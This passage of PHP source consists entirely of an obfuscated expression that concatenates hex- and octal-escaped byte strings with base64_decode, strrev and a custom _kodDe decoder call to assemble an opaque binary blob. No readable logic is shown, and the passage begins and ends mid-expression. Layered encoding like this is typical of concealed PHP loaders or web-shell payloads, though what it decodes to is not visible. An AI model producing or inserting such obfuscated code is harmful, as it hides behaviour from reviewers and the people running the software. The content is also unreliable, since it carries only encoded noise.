xba\x4a\x92\xa\xf\x41\x24\xf3\xaf\xf9\x7c"."\x69\xc1\x7e\xd4\xca\xdd\xe2\xa4\x2a\x34\xc1\xe8\x6e\x40\x27\x23\xd7\x96\x73\x65\x2e\xe7\x4e\xad\x72\xa2\x55\x15\xb\x2b\xd\xc9\xed\x41\xa1\x3a\x43\x6e\xa7\x75\x15\x88\xc5\xdf\x1\x25".base64_decode('2hflsqZbkGDNIYZ3tC4KTe7C48kmLBuHkSNGUETSWczG0jT5h1xtvE/+DN/QIQ==')."\x9\xd\x82\xad\x45\x20\x92\x14\xe4\xe7\x34\x39\x47\x18\x10\x59\x27\xa2\x0\xd4\xaf\x92\x2f\x85\xc2\x78\x57\x44\x64\xa3\xfe\x58\x1\x14\x3b\xa6\x7a\x61\x90\x4f\x14\x8a\x2\x9\x56\x40"."\xa\x40\x5b\x26\x5c\x25\x76\x3e\xe4\x42\x90\xfc\xa8\x5a\x18\xe3\x3d\x9c\x62\x52\x3c\x1b\x8\xb\x41\x87\xe3\xd2\xa4\xa6\xfb\xd4\xb4\xa8\x65\xe1\xd0\x1\xb6\x27\xf0\x2d\x9\x4e\x5c\x8b"."\136\310\75\324\67\246\205\134\213\143\43\332\35\33\20\313\73\205\235\203\253\20\100\353\141\126\241\355\244\44\113\313\51\301\40\235\156\6\62\151\330\62\161\311\224\115"."\xc8\x59\x8e\x53\xba\xc2\xe0\x34\xe7\xba\x2b\x98\x84\x7\x85\x64\x71\xb9\x9b\x6f\x97\xa6\x3c\xc2\x3a\xd1\x8d\x3e\xda\x7a\xf1\xd3\x5c\x28\xe\xba\x87\xa\xd4\x33\x51\xbb\x50\x50\x5c\x82"."\252\356\3\270\53\364\215\172\32\322\12\6\241\2\210\176\153\150\376\323\363\130\323\156\206\204\325\22\12\43\333\142\130\20\141\331\312\64\347\303\15\164\61\342\6\370".base64_decode('yySg5FkHXEx1kDBTrOF1TwuDmwD+FhJlrDTctMfkgfITst3GArUEeeUmOkVmeQ==').base64_decode('JqOkYzCJsNhMxVKdohwD4rwji2miA/CC5HTQViZs1HxhL9URe0Ro6KAFXwaQOw==').base64_decode('I3LWkQUV8yZzmkEYvRwDLCI9QIUWyoFjfBoVWuDC8cRUA0IgXdSoSpInFM7qGA==')."\114\44\133\20\131\216\274\121\342\374\234\155\234\51\145\241\75\301\61\1\221\161\7\337\265\304\75\117\74\216\204\7\232\370\113\70\303\117\261\23\116\4\164\350\206\226"."\xe1\x31\x42\x10\x47\xb\x51\xbc\x50\x21\x15\x43\x3f\x6a\x13\xa0\xe3\x31\xc4\xeb\x70\xa4\xa1\xb4\x24\x2f\x12\x6e\xf0\x84\x77\x24\x41\xa\x41\x6d\xee\x75\xbb\xb2\x59\x3a\x3f\x70\x87\xa0"."\46\25\0\105\20\134\334\101\252\21\56\104\255\161\341\236\156\176\66\217\213\202\25\73\360\66\343\220\143\61\77\325\154\212\337\371\111\105\105\117\341\202\220\271\4\53".base64_decode('SggVTu5KJvkhqjU8ZBa8WMVMImTIbLVIyKCnHYVgjD8VuTAz18WPtK3cmZkgDQ==')."\xbd\x85\xd3\x95\x6c\xe5\x2e\xd9\x80\x16\xe\x83\xed\xae\x26\xa1\xa6\x15\x9d\xed\x5a\x59\xbd\x40\x8f\xe1\xcc\x1c\x6a\x98\x60\x9c\xa0\x8a\x3\xd2\x26\x0\x88\x1b\x2\xd3\x37\x71\xa2\x20"."\xec\x79\x68\xff\x8\x1b\xa6\xdd\x3a\x80\xca\x10\xa6\xaa\x9\xfb\x60\x69\x60\x4c\xd6\x66\xb5\x94\xd7\xf\xa6\x7e\xe1\xf9\x60\x4d\xa7\x50\x8d\x1b\xa2\x30\xbd\x6a\xa1\x8e\x82\xf1\x83\x5b".base64_decode('/VBl0mhWFOcLVm34cMsXO9Z/+RYOPn3VCx98/+937r/7dRyePoOcmAwcggyk0A==').base64_decode('NzeOumDBoPbGtpOfud95+aMn39pSevk3tXfs/F2r8/7TXrtn8acbPzrlvd5Zlw==')."\xfc\xad\xfe\xf7\x4f\x9f\x38\xf7\xeb\xaf\xfd\x9b\xef\x68\xf8\xe5\xc3\x17\xe4\xd3\x37\x1f\x75\xea\xfd\x91\x43\xa6\x2e\xe9\xc\x2e\xf1\x2c\xbf\xef\xd5\x7\xae\x8e\x7e\xb7\xf0\xd3\xed\x4b"."\77\257\177\335\173\342\111\57\356\326\173\376\131\365\305\77\277\250\237\177\135\103\356\353\17\207\137\372\350\167\37\376\340\371\371\270\3\353\266\326\265\177\376\336\306\371".strrev('0;Ãuìº~#™ÒyŞßÚÚn8Møû¾·ˆö¡¼#1ÂwÔ³o%ÏÍÙBù¿&“')."\xbb\xee\xba\x69\xab\xda\x66\x7f\xfb\x69\x22\xbe\x67\x5b\x76\xd9\x2f\x7f\xbc\xea\xb5\x4c\xf5\xd3\x87\x9d\xf1\xc6\xfc\x1b\xcf\xf9\xfe\xb6\x63\xb6\x48\xbb\x1c\x37\xe9\xa5\xdf\x27\xc7\xa7"."\x77\x8e\xf8\xf7\x93\x1b\x3c\xbb\xa7\xce\x3c\x72\xf9\xf6\xc3\x9e\xae\xf5\x9d\x31\x6d\xd8\x88\x1b\x2f\x3b\x50\xbd\x6a\xd3\x83\xef\xfd\x7c\xe3\x57\x8f\x17\x1f\x75\xe4\xb2\x97\x5e\x18\xbf".base64_decode('+Xj3KX9+ct7bdZ1TNtt99wy76PtJl1fcsHrtE9mK9Ek9dXW7nw1VnfLdjHfX7Q==')."\371\70\326\374\37\337\27\353\36\151\171\353\351\337\76\132\167\110\331\115\376\370\155\347\125\47\157\13\374\173\241\166\345\310\206\320\364\316\121\277\377\361\77\353\16\374"."\x63\xfc\x97\xe7\x8c\x7e\xfb\xcf\x75\xa7\x4\x3a\xbe\x79\x68\xde\xc1\x3b\x5e\xfb\x31\xb4\xf5\x8a\xb3\x4f\x57\xc7\x35\xbe\xb8\x4c\xde\x22\xbd\xf9\xf3\xe6\xad\xc3\xd7\x94\x5e\x75\xff\xb5"."\x47\x1d\xd8\x7a\xc8\xec\xb7\x4e\x3e\xe2\x81\x85\x87\x4c\x99\xbb\xe3\xb5\x57\xa6\xc\xec\x2c\xb9\x31\x70\xfa\x15\x93\x1b\x97\x6d\x7e\xec\xa9\x5\xb7\x87\x56\x4e\xf8\xfe\xe5\xd\xdb\x9f"."\xca\xdd\xd0\x72\xbb\x72\xd9\x56\x77\xbb\x1e\x28\xbf\xff\xf8\xf3\x4f\x7d\x67\xe6\x79\xf\xf6\xbf\xd6\x74\xca\x94\xdf\xec\xba\x71\xca\x8c\xdb\x4b\x2e\x7e\x69\x65\xf6\xf4\xcf\xef\x59\x3f".base64_decode('quishjEbR/bcfdCE686OtW5cfNqJLsf8N7fXjHwrsGPU09s/faB0+TPe88tHPA==').base64_decode('/qp+YuctgRcz9y67d3Xb+3MOmXjY0nX2wUemHz5w00u3SKnDx35y2uu+tusv6g==').base64_decode('X71kzecHf5I4t+zFnd/0jzr3uR9ssx7fsCb3u2Pbr7r4qFavdM55sY8OmjF25g==').base64_decode('F5cdNMwY8eIb45/Yd/+Kqad9v23DP6tPOeToow994vIDB6bfIy+vefPiS49Yfg==').base64_decode('6OLR6UX3/G7fCyuOuOW5kCsy7R81HyudtaM/+GtK9szefeTpL6zylE06bfRxww==')."\x5b\xbf\x35\x3e\x5b\x66\xdb\x75\xfa\xce\x6b\xaf\x71\x27\xa6\x45\x4b\xdf\x5f\x59\x7a\x64\xf0\x82\x9a\xeb\x2f\xdb\x50\xac\xef\x72\xcf\xbe\x7a\xd7\xe0\xae\x7b\x5a\x4f\xbf\xe6\x9e\xfb\x9e".base64_decode('e6L0mnGxDbnE52c/5Fj1UKzvqTffuvF+x2mHbVz3wU3HXPvioroxH827Xhn93A==').base64_decode('R7vuK901esHiN+6/eOm1szafNrdpcPInj+/IjXxj6bVXzXh+96zxvSs/23SgNQ==')."\xfb\xc6\xf8\xfa\xb5\x47\xac\x71\xb4\xc6\x2e\x3f\x77\xcf\x3f\xf6\xad\x1d\xfc\xfb\xba\xbb\xdb\x1e\xb9\xae\x7c\xf5\x46\x6f\xd7\xd8\x3d\xbf\x8b\x8c\x7f\x6d\x77\xee\x91\xcc\x4f\xb3\xa6\xce".base64_decode('7PrXg6fccuvSGStb1y6+9oudBz310pRNJ29aU/a3N18bFnnzzNXX/s8/nrnsvQ==')."\55\147\234\173\313\227\363\337\173\254\364\332\343\276\233\360\354\25\177\33\73\162\177\131\351\157\76\133\161\304\332\223\227\256\137\366\352\355\372\361\237\14\46\2\363\146"."\x37\x5f\x7d\x5b\x4b\xcb\xde\xe3\x4f\xbb\xf4\xf2\x63\xd7\xac\x5e\x36\xed\x2e\x5f\xe9\x59\xaf\x3f\x71\xf8\xd4\x49\x53\x7\x6f\x79\x61\x55\x66\x6f\x77\xe7\x2e\xed\xf6\x8b\xee\xf8\x28\xfd".strrev('öoùtz¯çÇãş¼ø’Ş[\'/«ékH½ù¥µ¾jÛûüåw»9ãõŸw×Û\'¬Ê')."\x32\xa6\x51\xda\xae\xbf\xff\xf1\x84\xce\xc5\xcf\x9d\xbe\x4b\xba\xe1\xb9\xe5\xe7\x6d\xb8\xd3\xb3\xb0\xff\xa6\xf9\xdb\x46\x9e\x30\xee\xcc\x2b\xf7\xf\x4f\xbe\x6c\x5b\x77\xb1\x12\x5b\xd4".base64_decode('0zFjbF1TTe28msveHPnebQdX93z7w/COzrKT3gr+UNP48L93z39m67v/6Xh48w==')."\xea\xdf\x4d\xfd\xab\x72\x6c\xe6\xbe\x8d\x8b\x73\xb7\x87\xd2\x53\xeb\xab\x76\x3f\xbe\xf6\x82\xf4\xe8\x59\xc3\x93\x63\xcb\xb6\x5d\x71\xc5\xc4\xcb\x97\x46\xe6\xdd\x5c\x34\x3c\x72\xc4\xa8"."\xb3\x52\xe7\xef\x98\x91\xfa\xfe\xe7\x11\x2d\x21\xe3\xd3\xde\xf5\xf\xed\x18\x99\xfd\xeb\xcf\x27\xff\x32\x63\xc4\x49\x13\xaf\x7d\xea\xf7\xf3\x5b\x7f\x39\xee\xa2\xd7\xf6\xe\xbb\xeb\x9c"."\141\113\136\253\136\267\157\330\65\225\313\214\215\57\75\160\315\224\335\267\264\367\306\157\274\360\320\215\265\55\325\113\237\331\220\76\46\250\75\377\227\153\116\76\41\172".base64_decode('/vu/XfYXdc3HV4766PkvDx2e2/LD68dOPGbMk87KD5/uNZb+9KfmNZVjPw87Fw==')."\x74\xd7\x5f\xfc\xf9\xe5\xb9\xf5\x53\x9e\xe8\x49\x7a\xdf\x78\xf1\x3e\xe5\xbb\x87\xaf\xac\x74\xce\x9f\xb8\xea\xe8\x75\xae\x56\xf7\x93\x2b\xaf\xb4\xf\x9f\xbd\x7a\xfc\xbe\xf8\xea\xb\xaf"."\70\373\326\107\74\143\347\136\375\354\246\67\157\277\373\346\135\27\234\372\324\167\267\376\162\354\346\113\155\363\126\314\162\276\174\141\303\157\177\154\274\170\133\266\153\356"."\x9d\xa7\xed\x7b\xe1\xfd\x7d\xf\x6f\x5d\xd5\xff\xe6\xe9\xfe\xb1\x7\xf6\x2d\x73\xd\x1c\xf3\xce\xc3\xff\xfa\x68\x43\xe5\xe7\xdf\x3e\xf4\x3f\x9f\x9f\x34\xb6\x6c\xf5\x27\x23\x7\xfe\x35"."\347\52\137\353\354\333\76\333\375\312\23\256\236\313\126\316\74\254\267\265\53\271\143\361\260\37\22\327\155\173\175\356\366\7\367\235\245\34\376\306\344\337\214\232\72\372"."\xd1\xee\x96\xba\xd3\x7f\x7a\x6a\x7d\xf1\xf2\x97\x6f\x3b\x72\x91\x76\xc6\xa8\x1f\xa6\xae\xd5\x52\x7f\xd8\xb5\x29\xf4\xe7\x71\x17\x9c\xf9\xd9\xb0\x33\xf4\xc3\x1e\x3d\xe6\xed\x81\x3f\x9f".strrev('òté+Ûv¿›-µÿjúïÛ³ç?‹ÿpx~·Që|œoÓôİNkEÙmMğ5Ö±')."\xd1\x87\xbe\x9a\x70\xd2\x92\xa9\x37\x8f\xba\xe9\xd6\xd0\x59\x67\x55\x2d\x4c\xcd\x5c\xf1\xc9\x7d\xb1\x2b\x7a\xf\x59\x77\xdd\x4f\x1f\x3f\x7b\xef\x9c\x9f\x7f\xfc\xfa\xde\xc7\x16\xcf\x1e".base64_decode('HPjqg2fe/sN/vtrzr5u1ttk/ffzjmj+uf+yHr+71/5L96tn2Ex/75ekrBt/59A==')."\x81\xfd\xd\x5f\xfc\xb8\x60\x9f\xf6\xd3\xd8\xce\xe4\x94\x23\xcf\x5b\x3f\x6a\xba\x9a\xd9\xbc\x66\x79\xa8\xa4\xc1\x73\xe5\xf9\xb6\x39\x7b\x77\x4f\x5f\xff\x4e\xd9\xb7\xfe\xe3\x63\x25\xee".strrev('úŸ&kƒÕõ˜7+UŞüLöZÛ?Æ›5ÌsG'."\r".'üé>¬V“—»äd´aq_Øï')."\156\137\133\317\264\313\347\126\336\332\163\347\366\235\115\353\275\203\237\254\170\177\163\325\246\277\136\260\360\22\333\147\107\257\35\250\175\334\61\163\356\373\257\314\252\74".base64_decode('drD1hK+O37952mnnbltaN+0E7cTFb7868OD+1xvuG+EffWNgd/+Dd/ft+3yxtg==')._kodDe('KzA+s9jdpiBo/+JgrlNMsuAvuc9oGshoyShxwNTjhY6gr3KH06EziOSqjmWi3PI=')."\xee\x7b\xd5\x23\xfe\xfa\xf2\xc4\x8d\x2f\x1d\xf5\xfa\xb2\x71\x4f\xb4\x2c\x5e\xf1\xc7\xd\xe7\x7e\xf8\xe4\xae\xd2\xa6\xdf\x2c\xcf\x24\xd7\x4e\xca\xbd\x37\x7a\xd4\x35\xbe\x83\xbf\x1d\x35"."\362\206\267\47\155\17\277\164\225\363\214\27\236\311\336\221\71\266\150\364\373\277\375\341\325\222\303\326\134\324\360\372\376\177\335\371\354\325\143\377\362\330\366\203\236\332".base64_decode('t3Vdxa2zLh356JObx66M/mPbmFXbLrnr/TVrI2XZbz+LbHnN0XHoYLGS3jLm3g==')."\xf2\xe9\x37\x3c\xf5\xf3\x4f\xa3\x57\x1f\x75\xc3\xf7\xff\xb8\x3d\x31\xf6\xa2\x64\xf3\x92\x45\xa9\xb5\x5f\x3e\xf4\x3f\xb6\x55\xfe\x1f\x9b\xb7\x4c\x3e\xd9\xfd\xfa\xb1\x3f\x7c\xb7\x70\xf7"."\360\252\324\135\255\322\355\367\56\135\223\170\351\367\167\114\170\143\353\337\357\255\175\371\305\23\166\30\145\311\113\373\307\75\326\76\372\212\47\227\176\267\363\320\366\273".base64_decode('2+zbZu6+9ePc0tP/fPwJ31z+8AML3zj51Hd7h33rOjg19b6Kna6SBTsm/nnatA==')."\x6b\xae\xbd\xee\x8\xf5\x4f\xa7\x4d\x49\x6f\x8b\x8d\xba\xed\xaa\xe7\xdd\xbd\x57\xc9\x87\x3d\x1a\x7b\x7e\xd7\xf1\x9b\xaf\x5c\x74\xe5\x81\x95\xb5\x7f\x59\xf5\xc4\xef\xc7\x95\xc7\xf7\xae".strrev('Aåt}¬F[	Én¼.ŸYß.•›çd~smà[MÔÿôÔú\\53Şòâ2›wóx')."\xd2\x83\xe5\x7f\xd8\xfe\xb4\xf3\x95\x68\xbc\xf9\x89\x51\x2f\xad\x3f\xd4\xf6\xd2\xeb\xf6\xed\x6d\x1f\xbf\xde\xd9\x71\xd2\x3d\xc7\xd8\xaf\x6e\xfc\x79\xf6\xd7\x1b\x2e\x9c\xf1\x44\xf2\xa2".base64_decode('eeuOrZzh+sPvH7vwqJPWH/fBfYfNv7wj57xg1P2rHpk/vm7dU2e3picee8W89g==')."\46\307\244\33\173\237\374\175\317\111\177\235\336\227\332\366\117\367\364\117\17\335\272\342\205\266\163\67\164\356\324\52\265\163\116\176\357\330\362\217\216\362\34\27\375\313"."\103\137\214\363\276\174\375\226\257\367\155\377\346\256\243\143\343\226\224\55\173\154\374\201\367\56\10\254\230\270\245\61\171\354\336\257\177\267\145\373\342\341\363\233\142\307".base64_decode('vBdfUzKiw3b9wSO2Hbqy4vq+XcO0M+ZXPt5ww4pmt2PZusvU8nXnb+2vuT2X2Q==')."\175\344\67\273\26\377\161\377\53\215\37\45\217\237\72\332\375\342\230\252\331\157\135\367\367\346\257\73\156\211\114\131\365\335\267\147\137\164\370\322\327\66\166\364\274\272".base64_decode('sPe2LVNPWrJgxSkHBnueWXCt65birvCtn7/12X+u2fH88xcdffAxG1+8s2O18g==')."\xc9\xc7\x45\x45\x3f\x1f\x38\xeb\x6f\xc3\xcf\xb5\x1f\xbe\x4a\xd9\xd4\x7c\x69\xac\x72\x95\x14\xbb\x6e\x84\x7d\xde\x94\xef\xbf\x68\xba\xe5\xf9\x3f\x1e\xbd\xdf\x7f\xc7\xda\xc3\xdf\xbb\xe7".strrev('ˆ’ÆÀËú¯²=¬6ïıõg=¬ooAÎzŞµGkÏ öµ8_–“äËx®x®ŸKª')."\x76\xdc\x51\x3b\xbf\x2e\x3e\x2b\xfd\x75\xd9\x8e\x97\x5b\x5e\x9c\x71\xe4\xf2\x57\xef\xd9\x73\x73\x78\xce\x82\x8b\x47\x3c\xf2\xc7\xaf\x5e\x7c\xfb\xfa\xaa\xfd\x1f\xbf\xa6\xcd\x79\xec\xc7"."\xaf\xaf\xfc\xe0\x8b\xc1\xc1\x9f\xaf\x7f\x7b\xfd\x63\xbf\x3c\xf1\xf4\xf\xfe\xeb\x7e\x7a\xf7\xfa\xb7\xff\xf0\xe3\xbb\xfb\xd7\x38\xa3\xb\x8c\xfd\xdf\xdf\xb8\xfc\x8f\x83\xc7\xfd\x32\xb8".base64_decode('7+bl/5y95fsvd+8L//L5j+d953j05zf2nHj9z9+9fb3+l2Hfbx/x8vd37CjWKg==')."\x2e\x9e\x11\x7f\xba\x7d\xd1\xf1\xd7\x7e\xb5\xed\xb3\x53\x9d\xe7\xdd\xfc\xda\xc3\x53\xbe\xfb\x4f\xdf\xfe\x86\xd\x7f\xb2\xbf\xd1\xd5\xf9\xf0\xee\x8f\xbe\xed\xee\xfe\x61\x69\xcf\xf0\x1f".base64_decode('hm/d+mJvRVXloz2/3DG8fmtlefyvuYoHTr+y//A5h934rz0dg9vKBm46+/Zpaw==')."\xe3\xef\x7e\x7b\xf4\x13\x1d\xef\xf4\x94\x1c\x78\xe1\xe3\x9b\xae\xda\x74\x60\x87\xf6\xe4\xd7\xcb\xae\xdf\x7e\xa5\xe7\xb2\x2f\xb7\xfd\xf3\xdc\x1d\xe3\x2a\x4e\xad\xbd\xe3\xa5\x4d\x97\x1c".strrev('è<k¦Şô¿gÏÌş¾6ã5÷D‚á¹Ÿ÷›èprµyzìîßöö½.ïï†ãr¾>›}')."\x97\x43\x4e\x4b\xdf\xf1\xf8\xf2\x93\xa8\x39\x7e\x6f\x7f\x77\x7b\x4f\x8e\xa8\xdc\x88\x49\x49\x57\x3c\x1b\x55\x93\x84\xbf\x27\xd6\xc6\xd3\xcb\x89\xed\xb\xf9\xe9\x8f\xc9\x5d\x5a\x86\x70"."\xfe\x93\x27\x91\x9c\x93\x27\x4f\xc3\x1f\x40\xbc\x89\x75\xe6\x54\x2a\xe\x47\xd4\xfe\x4\xb1\xb4\x8a\xf6\xb4\xc7\x3a\xe2\xe4\x2c\x72\x32\x2d\x9c\xd4\x3f\x95\x94\x33\x6d\x2a\x61\xea\xe5"."\x4c\x2e\x46\xad\xb9\x26\x4d\x23\xdc\x76\xc5\x74\x52\x4b\xc5\xc\xf2\xd1\x6b\x24\x53\xb1\xe\x22\x36\xcf\x98\x46\x8a\xcd\xa9\x9\x20\x2e\x74\x90\xb4\x53\x48\xda\x19\xb4\x27\x6a\x57\x34"."\xdd\xdb\x49\xe\x6f\xd2\xa9\x8e\x48\x57\x3f\x35\x6f\x48\xf5\x1b\xf1\x1e\x72\x1a\x5a\x4e\x9b\x92\xe8\x8f\xe8\x44\xcb\xd2\xde\x1d\xcd\xf4\xf7\x91\xf3\xb1\x64\x67\x97\x12\xeb\x26\x28\x9c".base64_decode('OpmkL59O+lAxmaAwoXXF+qkA0p4xook+og6LdEU7U9Qoe1oFaej0CtKPyWXkAA==')."\165\332\44\202\201\362\151\223\50\236\323\321\154\57\151\110\71\355\131\326\110\52\355\271\176\122\177\305\124\72\112\4\217\123\150\51\63\10\144\362\264\351\24\165\44\11"."\211\220\173\214\366\164\234\210\105\345\24\203\35\271\130\46\322\105\216\156\163\35\75\311\124\47\231\54\123\246\321\26\50\51\176\235\143\62\255\271\67\325\16\60\320\103"."\373\120\101\121\66\203\324\76\225\64\254\243\73\235\211\346\310\34\351\326\372\22\31\235\240\167\372\44\222\151\306\224\162\212\45\322\275\276\164\147\127\44\25\247\321\164".strrev('2i:ÉhÆtt®9u’ÓG"nÙS©0HN¿¯¢z­S);¿º{fi¹ı}]²‘&').base64_decode('aUo5HZ4ZtJ/l5aTWrl45He0nHZ5SRtqU7u3pS1ILwElTCVanTSfFTKXDMokuhw==')."\x19\x53\x49\x67\xe5\x4c\x7f\xc2\xa0\x88\x89\xe4\x3a\x55\x85\xce\x9a\x9e\x78\x7f\xac\x8b\x2a\x1\x7b\xbb\x3b\xe5\x14\x3d\x6c\x48\xc7\x52\x3d\xc9\x4e\x92\x6c\xfa\xc\xd2\xfa\x44\x46\x8d".strrev('J’$^§ËShÓb2'."\n".'¤Ïm*y©®¾é“vj‚r½£dwS”¡dêÉ/« '."\n".'Ôj').base64_decode('j9zbSdORLvXpPfF2rZMiO92v6bRlU0nL1FRvhhlYxDQl09FNtDxab193rocElA==')."\56\71\325\107\17\244\46\227\117\242\23\220\124\337\331\53\367\347\332\11\346\51\341\350\215\351\375\235\135\4\57\323\350\100\116\57\237\114\273\105\40\132\274\127\217\321"."\123\362\216\114\44\246\367\222\300\24\332\363\170\264\247\203\131\12\246\342\135\21\103\47\263\35\254\230\236\376\10\41\36\323\31\311\302\277\255\51\322\342\152\71\332\111"."\125\317\272\41\33\71\335\222\200\135\327\110\73\122\162\232\231\126\324\23\232\32\25\355\170\305\4\235\212\102\155\113\251\315\52\77\273\327\163\310\12\236\300\325\224\2"."\xb5\x28\x34\x35\x57\x7b\x40\xcd\x95\x70\xe2\xf\x83\x41\x31\x67\x34\x6d\x8\xd1\x20\x64\x8a\xd\x1a\x5a\x96\xd9\x18\x60\xeb\x25\x7\x6c\x95\xc3\xdc\xcf\x32\x82\x49\x7c\x70\x2f\x1e\x8f".base64_decode('UbWyrvdoWYKOTi0WTWq5mKnUWMRUJoNSbY81Jj4EHJTDjy8FmAlBETRizPYE/g==')."\107\232\213\57\34\351\112\127\116\141\6\361\70\265\203\216\101\104\30\156\254\272\67\144\275\323\41\202\355\142\254\232\6\315\114\46\35\346\213\150\360\126\22\235\35\141"."\156\230\13\333\331\54\330\213\300\260\240\117\25\72\304\7\115\300\240\70\166\346\316\323\263\33\260\233\303\153\125\324\70\206\116\30\301\42\61\23\323\30\64\106\211\65"."\x46\xc\x59\x99\xa9\x3e\x18\x14\xbe\xd9\x58\x87\x94\x54\x6\x8e\x18\x69\x82\x13\xdf\x54\xe1\xe6\xb5\xe6\x61\x2d\xd4\x7\x1c\x51\x60\xb4\x60\x47\x38\x9e\x4a\xe0\x27\x39\x5e\x82\xba\x48"."\x29\x2e\x3\x40\xac\x52\x8a\x83\x6c\x12\x35\x48\x97\xc\x8d\x7e\x93\x51\x70\xc2\x51\x70\xa2\x46\xb\x23\x20\xc6\xe1\x9e\xf2\x48\xcb\x4c\x2c\x88\x61\xd6\x68\x86\x65\x83\x8e\x2d\xd7\x14"."\223\156\10\106\330\370\50\206\3\304\251\155\136\227\246\111\157\136\321\142\224\31\157\344\334\23\135\210\263\111\270\51\66\11\35\250\112\346\73\132\136\267\304\116\246\305"."\171\54\66\77\253\144\300\76\313\232\236\351\53\210\162\261\65\342\151\256\245\153\301\2\150\144\235\63\105\202\221\311\31\5\22\212\330\66\235\156\152\65\111\100\155\270".base64_decode('STI68+bdwEF2PhUEFTFilVViKrUQVVIoJSFS2MaemaZGk4qcNZ19zZqTSWTgJQ==')."\x58\x63\xe6\x1c\x72\x13\x8f\x9c\xee\x85\x85\x7a\xc9\x37\xbf\x33\x20\x42\x93\xd6\xf3\x34\x4a\x30\x1c\xee\x6a\xe1\xb6\x2a\x4c\x46\x72\xf0\x43\x52\x0\xf3\xc0\x5\x3d\x14\xdc\xcd\x8c\xc"."\244\140\256\275\135\321\215\112\164\17\106\232\50\201\266\114\163\114\6\37\150\121\114\161\114\3\237\10\21\344\130\252\55\315\353\305\137\271\64\374\16\344\322\160\14\52"."\205\126\305\111\257\34\74\255\74\221\307\53\261\61\4\63\102\37\172\110\2\232\67\54\307\311\365\37\157\132\204\360\311\32\6\44\54\114\366\114\62\132\325\256\240\267"."\46\334\344\242\166\342\162\46\343\324\143\235\272\23\332\167\251\335\212\117\215\70\341\275\72\210\121\107\204\132\45\0\324\203\146\310\21\55\153\320\161\316\101\163\177\322".base64_decode('9AbzFAB4srNZAUYaVB/TkXEhIR+kc7pwmzDAJxTMjtD6K1kNcfQzoItpZiuoJw==')."\145\172\140\251\203\176\253\151\205\115\305\234\56\232\131\53\174\145\103\173\334\60\330\151\351\226\3\46\161\70\246\222\244\76\157\165\330\355\15\10\150\315\344\254\150\25".base64_decode('73G7mrzhYNAvILlSIP3wzgw/+oYhfncGniqJVkYiKwDv2UKL5qBELOvAVK+pdw==').base64_decode('BZjV8hRHmaOcpwUVhqHxdhW9uBcMuQIF7lzju9hkEMj9a5Kh3t8i1fh9zQ2NQQ==')."\174\311\30\303\33\375\102\74\262\115\45\321\364\106\166\176\64\51\336\323\344\163\325\170\44\157\143\310\117\215\317\231\341\40\272\166\20\144\141\212\202\254\256\260\273\326"."\44\77\16\210\127\43\304\22\131\111\144\1\55\264\25\267\25\265\115\150\53\151\53\135\342\150\323\27\71\305\41\41\73\163\223\233\164\251\222\175\261\355\274\41\30\234"."\x47\x6e\xd4\xf8\x3\xae\x1a\x1f\xad\x1e\x2c\x24\xf2\xe9\xaf\xf1\xe2\x8f\xf\xd6\xde\xfd\xfe\x43\xab\x3e\xf8\xf3\x9d\x7b\x96\xad\x4\x5\xed\xbd\xe6\x4f\x7b\xaf\xbc\xff\xfd\x7\x57\x7e"."\x78\xde\xdf\xf7\xdc\xb9\xe2\x83\x47\x57\xed\x5d\x7b\xd7\xde\x15\xe7\x92\x36\x7f\x78\xd7\x3\xef\xff\xfd\xb1\xf\xd6\xde\xb2\xe7\xce\xab\xf6\xae\xdb\xf2\xc1\x35\xe7\xe3\x88\x8f\x6e\xbd"."\173\317\45\267\260\206\111\37\255\171\164\357\252\233\366\136\261\171\357\312\73\367\74\264\146\317\43\177\332\363\340\203\66\220\373\243\13\126\176\360\367\73\367\136\274\156"."\357\215\347\354\275\157\371\336\365\53\367\134\262\141\317\325\267\174\260\352\256\75\67\234\267\347\302\225\37\336\165\305\30\353\344\301\341\205\24\375\304\244\301\271\270\115"."\237\120\202\121\332\246\117\204\350\54\5\277\45\320\176\35\374\122\123\135\60\345\202\360\272\133\143\215\307\172\37\104\14\222\313\351\23\360\254\200\223\232\261\211\72\271"."\xdc\x4e\xc3\x61\x74\x5\xa8\x78\xc8\x56\xc\x90\x31\x17\x1a\x25\x34\xc6\xed\x9\xd6\x4\xbc\xd5\x1e\x62\x21\xcd\x6\x6a\x1c\x32\xbe\x25\x96\x11\x0\x1a\xc\xcc\x67\xdf\xec\x52\x54\x9e".base64_decode('SwGphE7gUsnUEdkR1ZK5VBo1ViqCVkpFNkggESsoFcEtEwCUKFhuJfCKMbLWLA==')."\156\55\266\225\331\312\113\45\342\157\0\347\40\376\5\244\42\142\263\313\362\231\52\261\105\114\241\162\133\131\251\124\224\351\54\42\355\342\170\5\255\17\343\224\272\44".base64_decode('20pIg8Xm8rSARulGVlYB0ZKiNgZi+cGvyWdA1MFz4HECKawwydXoNqfErgaaig==')."\45\71\35\3\61\30\277\342\60\27\227\112\21\142\167\136\40\22\145\63\41\243\312\204\214\222\211\204\66\64\325\261\361\306\246\342\22\276\163\204\233\45\353\164\240\10"."\24\15\25\204\342\321\242\151\65\320\15\60\70\70\75\370\140\61\235\112\37\57\11\220\40\26\101\107\20\302\331\40\26\210\103\76\40\212\60\313\207\373\231\322\333\51"."\x79\x23\xbe\x7\x1a\x5a\x59\x1f\xe8\x5c\x26\x43\xa0\x70\xf\x12\xf0\xf6\x94\x27\x54\x53\x8f\x67\x79\x50\x98\xe6\xb1\xc8\x38\xd3\x44\xe5\xe8\x94\x4c\x53\x84\x49\x19\x24\x1d\x5e\x2e\x90".base64_decode('IIxA6byNtf5AA741FKyp9zS4HIRw45mA00PGSqqSiiHlw6BiE/pRRRRlIVQrWA==')."\x57\x61\x3\xb0\x50\x18\xb\x99\x76\xd2\x18\x32\xfa\x12\xba\x4b\x2a\xa3\x2c\x55\xc5\xf8\x6a\x36\x29\x92\x39\x3c\xf1\x7\x42\x61\x80\x0\x42\x9e\x5\xaa\x5b\x2c\xec\x10\x82\x6d\x2f\xbc"."\374\322\115\31\376\270\34\5\122\71\365\74\20\241\176\121\100\341\260\314\32\177\143\255\227\136\220\162\107\114\161\356\200\27\136\7\46\325\162\331\217\333\175\200\100\246"."\x27\xc6\xbe\xf9\x55\x58\x18\xc1\x76\x74\x10\xe0\x1b\x3a\x8c\x11\xdc\xb3\xc0\x6a\x82\x8d\xec\x9b\xf3\xad\x20\x0\x6d\x2c\x39\x6d\x6d\x71\xb3\xef\x7a\x76\x77\x11\x46\xf8\x3\x42\xc0\x15"."\160\65\4\131\60\320\2\150\65\204\11\167\370\32\134\301\20\350\125\143\163\3\247\347\76\327\174\60\25\374\24\233\124\230\160\56\56\161\114\230\123\332\206\157\50\341"."\x4f\xfc\x73\x26\xd\xc1\x9b